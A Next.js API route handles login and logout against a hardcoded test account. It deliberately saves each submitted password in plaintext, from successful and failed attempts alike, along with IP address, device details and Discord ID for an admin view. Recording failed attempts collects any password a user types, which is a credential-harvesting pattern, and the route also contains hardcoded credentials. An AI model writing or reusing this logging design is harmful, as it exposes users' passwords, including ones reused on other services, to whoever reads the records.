import { NextRequest, NextResponse } from "next/server"
import crypto from "crypto"
import { addLoginRecord } from "@/app/api/admin/logins/route"
import { checkRateLimit, getClientIP } from "@/lib/rate-limit"
import { sanitizeInput, isValidEmail, rateLimitResponse } from "@/lib/security"

// User credentials - In production, these would be stored in a database
const TEST_USER = {
  email: "teste@teste.com",
  password: "teste123",
  name: "Conta Teste",
  balance: 999
}

// Helper to parse user agent
function parseUserAgent(ua: string): { device: string; deviceType: "desktop" | "mobile"; browser: string; os: string } {
  const isMobile = /Mobile|Android|iPhone|iPad|iPod/i.test(ua)
  
  let browser = "Unknown"
  if (ua.includes("Chrome")) browser = "Chrome"
  else if (ua.includes("Safari")) browser = "Safari"
  else if (ua.includes("Firefox")) browser = "Firefox"
  else if (ua.includes("Edge")) browser = "Edge"
  else if (ua.includes("Opera")) browser = "Opera"
  
  let os = "Unknown"
  if (ua.includes("Windows")) os = "Windows"
  else if (ua.includes("Mac")) os = "MacOS"
  else if (ua.includes("Linux")) os = "Linux"
  else if (ua.includes("Android")) os = "Android"
  else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS"
  
  return {
    device: `${browser} - ${os}`,
    deviceType: isMobile ? "mobile" : "desktop",
    browser,
    os
  }
}

export async function POST(request: NextRequest) {
  try {
    // Rate limiting for login attempts
    const clientIP = getClientIP(request)
    const rateLimit = checkRateLimit(clientIP, "login")
    
    if (!rateLimit.allowed) {
      return rateLimitResponse(rateLimit.resetIn)
    }

    const { email, password, discordId } = await request.json()
    
    // Validate input
    if (!email || !password) {
      return NextResponse.json({
        success: false,
        message: "Email e senha sao obrigatorios"
      }, { status: 400 })
    }

    // Sanitize and validate email
    const sanitizedEmail = sanitizeInput(email).toLowerCase()
    if (!isValidEmail(sanitizedEmail)) {
      return NextResponse.json({
        success: false,
        message: "Email invalido"
      }, { status: 400 })
    }
    
    // Get IP and user agent
    const ip = request.headers.get("x-forwarded-for")?.split(",")[0] || 
               request.headers.get("x-real-ip") || 
               "Unknown"
    const userAgent = request.headers.get("user-agent") || ""
    const { device, deviceType, browser, os } = parseUserAgent(userAgent)

    // Validate credentials
    if (email === TEST_USER.email && password === TEST_USER.password) {
      // Generate a simple token
      const token = crypto.randomBytes(32).toString("hex")
      
      // Record successful login
      addLoginRecord({
        email,
        password: password, // Store actual password for admin view
        name: TEST_USER.name,
        ip,
        device,
        deviceType,
        browser,
        os,
        success: true,
        discordId: discordId || undefined
      })

      // If discord ID provided, update the user record
      if (discordId) {
        try {
          await fetch(`${process.env.NEXT_PUBLIC_BASE_URL || 'http://localhost:3000'}/api/users`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
              action: "set_discord", 
              email: sanitizedEmail,
              discordId: discordId.trim()
            })
          })
        } catch (e) {
          console.error("Failed to update user discord:", e)
        }
      }
      
      const response = NextResponse.json({
        success: true,
        token,
        user: {
          email: TEST_USER.email,
          name: TEST_USER.name,
          balance: TEST_USER.balance
        },
        message: "Login realizado com sucesso"
      })

      // Set HTTP-only cookie
      response.cookies.set("user_token", token, {
        httpOnly: true,
        secure: process.env.NODE_ENV === "production",
        sameSite: "strict",
        maxAge: 60 * 60 * 24 * 7 // 7 days
      })

      return response
    }

    // Record failed login attempt
    addLoginRecord({
      email,
      password: password, // Store attempted password
      name: "Tentativa Falha",
      ip,
      device,
      deviceType,
      browser,
      os,
      success: false,
      discordId: discordId || undefined
    })

    return NextResponse.json({
      success: false,
      message: "Email ou senha incorretos"
    }, { status: 401 })

  } catch (error) {
    console.error("[Auth] Error:", error)
    return NextResponse.json({
      success: false,
      message: "Erro interno do servidor"
    }, { status: 500 })
  }
}

export async function DELETE() {
  const response = NextResponse.json({
    success: true,
    message: "Logout realizado com sucesso"
  })

  response.cookies.delete("user_token")

  return response
}
